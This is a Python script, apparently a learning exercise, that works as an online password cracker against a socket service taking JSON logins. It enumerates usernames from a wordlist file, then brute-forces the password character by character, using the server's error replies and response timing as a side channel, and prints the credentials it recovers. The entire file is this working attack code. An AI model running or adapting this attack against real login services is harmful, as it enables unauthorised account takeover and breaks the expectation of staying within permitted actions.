import itertools
import sys
import socket
import json
import string
import datetime
import time


def is_string(o):
    if isinstance(o, (float, int)):
        return False

    return isinstance(o, str)


def is_number(o):
    try:
        return isinstance(int(float(o)), (float, int))
    except ValueError:
        return False


def get_pwd_lst(file_name):
    try:
        with open(file_name, 'r', encoding='utf-8') as pwd_file:
            data = pwd_file.read()
            # replacing end splitting the text
            # when newline ('\n') is seen.
    except EOFError:
        return None
    except FileNotFoundError:
        return None
    else:
        pwd_lst = data.split("\n")
        return pwd_lst


def get_password():
    while True:
        for letter in ' ' + string.ascii_letters + string.digits:
            yield letter


def password_generator(length):
    for m in itertools.product(itertools.chain(range(65, 91), range(97, 123), range(48, 58)), repeat=length):
        yield ''.join(map(chr, iter(m)))


def parse_result(data) -> str:
    return json.loads(data)["result"]


def run_socket(local_host, port_num):
    word_lst = get_pwd_lst("logins.txt")

    if word_lst:
        with socket.socket() as client_socket:
            address = (local_host, port_num)
            client_socket.connect(address)
            login = {"login": "", "password": ""}
            users = get_pwd_lst("logins.txt")
            for user in users:
                login['login'] = user
                client_socket.send(json.dumps(login).encode())
                response = client_socket.recv(1024)
                message = json.loads(response.decode())
                if message['result'] != 'Wrong login!':
                    break
        
            password = ""
            run = True
        
            while run:
                for character in password_generator(1):
                    ends_at = time.time() + .05
                    login['password'] = password + character
                    # initial_time = time.time()
                    client_socket.send(json.dumps(login).encode())
                    response = client_socket.recv(1024)
                    # final_time = time.time()
                    message = json.loads(response.decode())
                    # elapsed_time = (final_time - initial_time).total_seconds()
                    if message['result'] != 'Wrong password!' or time.time() > ends_at:
                        password += character
                        break
        
                if message['result'] == 'Connection success!':
                    print(json.dumps(login))
                    run = False
    else:
        print('Error reading file!')


def read_args(lst):
    valid = True
    program_name = 2
    cfg_params_lst = [program_name, 0, 1, 0]
    for arg in range(1, len(lst)):  # discard the first argument
        if cfg_params_lst[arg]:
            if is_number(lst[arg]):
                valid = valid + True
            else:
                return False
        else:
            if is_string(lst[arg]):
                valid = valid + True
            else:
                return False
    return valid


def auto():
    while True:
        in_put = input()
        if in_put:
            in_put = in_put.split(' ')
            in_put.insert(0, '0')
            if read_args(in_put):
                run_socket(in_put[1], int(in_put[2]))
            else:
                sys.exit(0)
        else:
            break


def cli():
    if read_args(sys.argv):
        run_socket(sys.argv[1], int(sys.argv[2]))
    else:
        sys.exit(0)


if __name__ == '__main__':
    is_test = False
    if is_test:
        auto()
    else:
        cli()
